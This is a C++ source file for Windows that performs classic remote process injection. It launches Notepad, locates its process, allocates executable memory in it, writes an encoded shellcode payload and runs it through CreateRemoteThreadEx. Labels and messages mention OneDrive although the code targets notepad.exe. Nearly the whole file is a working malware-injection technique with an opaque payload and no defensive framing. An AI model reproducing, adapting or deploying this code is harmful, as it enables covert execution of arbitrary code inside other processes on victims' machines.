#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <assert.h>
#include <strsafe.h>

// Debugging Identifiers
const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD dPid, TID = NULL; // Desired PID 
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread, hFile = NULL;
BOOL pidFound = FALSE;
char first[] = "\x48";
unsigned char sCode[] =
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x0a\x2a\x8b\x75\xff\xcb\x1c\x24\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf6\x62\x08"
"\x91\x0f\x23\xdc\x24\x0a\x2a\xca\x24\xbe\x9b\x4e\x75\x5c"
"\x62\xba\xa7\x9a\x83\x97\x76\x6a\x62\x00\x27\xe7\x83\x97"
"\x76\x2a\x62\x00\x07\xaf\x83\x13\x93\x40\x60\xc6\x44\x36"
"\x83\x2d\xe4\xa6\x16\xea\x09\xfd\xe7\x3c\x65\xcb\xe3\x86"
"\x34\xfe\x0a\xfe\xc9\x58\x6b\xda\x3d\x74\x99\x3c\xaf\x48"
"\x16\xc3\x74\x2f\x40\x9c\xac\x0a\x2a\x8b\x3d\x7a\x0b\x68"
"\x43\x42\x2b\x5b\x25\x74\x83\x04\x60\x81\x6a\xab\x3c\xfe"
"\x1b\xff\x72\x42\xd5\x42\x34\x74\xff\x94\x6c\x0b\xfc\xc6"
"\x44\x36\x83\x2d\xe4\xa6\x6b\x4a\xbc\xf2\x8a\x1d\xe5\x32"
"\xca\xfe\x84\xb3\xc8\x50\x00\x02\x6f\xb2\xa4\x8a\x13\x44"
"\x60\x81\x6a\xaf\x3c\xfe\x1b\x7a\x65\x81\x26\xc3\x31\x74"
"\x8b\x00\x6d\x0b\xfa\xca\xfe\xfb\x43\x54\x25\xda\x6b\xd3"
"\x34\xa7\x95\x45\x7e\x4b\x72\xca\x2c\xbe\x91\x54\xa7\xe6"
"\x0a\xca\x27\x00\x2b\x44\x65\x53\x70\xc3\xfe\xed\x22\x4b"
"\xdb\xf5\xd5\xd6\x3c\x41\xbc\x6f\x16\x55\x19\xb9\x75\xff"
"\x8a\x4a\x6d\x83\xcc\xc3\xf4\x13\x6b\x1d\x24\x0a\x63\x02"
"\x90\xb6\x77\x1e\x24\x0b\x91\x4b\xdd\xf1\xd3\x5d\x70\x43"
"\xa3\x6f\x39\x76\x3a\x5d\x9e\x46\x5d\xad\x72\x00\x1e\x50"
"\xad\xe0\x42\x8a\x74\xff\xcb\x45\x65\xb0\x03\x0b\x1e\xff"
"\x34\xc9\x74\x5a\x67\xba\xbc\xb2\xfa\xdc\x6c\xf5\xea\xc3"
"\xfc\x3d\x83\xe3\xe4\x42\xa3\x4a\x34\x45\x21\x13\xfb\xea"
"\xd5\x5e\x3d\x76\x0c\x76\x34\x4b\x72\xc7\xfc\x1d\x83\x95"
"\xdd\x4b\x90\x12\xd0\x8b\xaa\xe3\xf1\x42\xab\x4f\x35\xfd"
"\xcb\x1c\x6d\xb2\x49\xe6\x11\xff\xcb\x1c\x24\x0a\x6b\xdb"
"\x34\xaf\x83\x95\xc6\x5d\x7d\xdc\x38\xce\x0b\x76\x29\x53"
"\x6b\xdb\x97\x03\xad\xdb\x60\x2e\x7e\x8a\x74\xb7\x46\x58"
"\x00\x12\xec\x8b\x1d\xb7\x42\xfa\x72\x5a\x6b\xdb\x34\xaf"
"\x8a\x4c\x6d\xf5\xea\xca\x25\xb6\x34\xd4\x69\x83\xeb\xc7"
"\xfc\x3e\x8a\xa6\x5d\xc6\x15\x0d\x8a\x2a\x83\x2d\xf6\x42"
"\xd5\x41\xfe\xf1\x8a\xa6\x2c\x8d\x37\xeb\x8a\x2a\x70\xec"
"\x91\xa8\x7c\xca\xcf\x59\x5e\xa1\xb9\xf5\xff\xc3\xf6\x3b"
"\xe3\x20\x22\x76\x20\x0b\x8e\x1f\xbe\x19\x9f\x4d\x39\xf9"
"\x1a\x95\xcb\x45\x65\x83\xf0\x74\xa0\xff\xcb\x1c\x24";

BOOL GetOneDrivePID(DWORD pid) {
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

    hProcess = OpenProcess(PROCESS_ALL_ACCESS,
        FALSE, pid);

    if (NULL != hProcess) {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
            GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
        }


    }
    _tprintf(TEXT("NAME: %s ---> PID: (%d)\n"), szProcessName, pid);

    if (!_tcscmp(szProcessName, L"notepad.exe")) {
        CloseHandle(hProcess);
        return TRUE;
    }

    CloseHandle(hProcess);
    return FALSE;
}

void OpenNotepad() {
    ShellExecute(NULL, NULL, L"C:\\Windows\\notepad.exe", NULL, NULL, SW_SHOWNORMAL);
}

int main() {
    DWORD aProcesses[1024], cProcesses, cbNeeded;

    OpenNotepad();
    printf("%s Error: %ld", e, GetLastError());

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        std::cout << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    // Calculate amount of proccesses enumerated
    cProcesses = cbNeeded / sizeof(DWORD);

    for (int i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            if (GetOneDrivePID(aProcesses[i]))
            {
                pidFound = TRUE;
                dPid = aProcesses[i];
                break;
            }
        }
    }

    if (!pidFound) {
        printf("%s Did'nt find the OneDrive.exe process\n", i);
        std::cin.get();
        return EXIT_FAILURE;
    }

    printf("%s Trying to open a handle to process: (%d) \n", i, dPid);

    // Open A handle to the desired process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dPid);

    if (NULL == hProcess) {
        printf("%s couldn't open a handle to the process (%ld)\n Error: %ld\n", e, dPid, GetLastError());
        std::cin.get();
        return EXIT_FAILURE;
    }

    printf("%s successfuly opened a handle to the process (%ld)", k, dPid);

    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(sCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("%s successfuly aloccated a size of %zu bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(sCode));


    // Write the process memory
    if (WriteProcessMemory(hProcess, rBuffer, sCode, sizeof(sCode), NULL))
        printf("%s successfuly written to the process' memory\n", k);
    else
        return EXIT_FAILURE;

    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        0,
        &TID
    );

    if (hThread == NULL) {
        printf("%s failed to get a handle to the thread (%ld)\n Error: %ld\n", e, TID, GetLastError());
    }

    CloseHandle(hProcess);


    return EXIT_SUCCESS;
}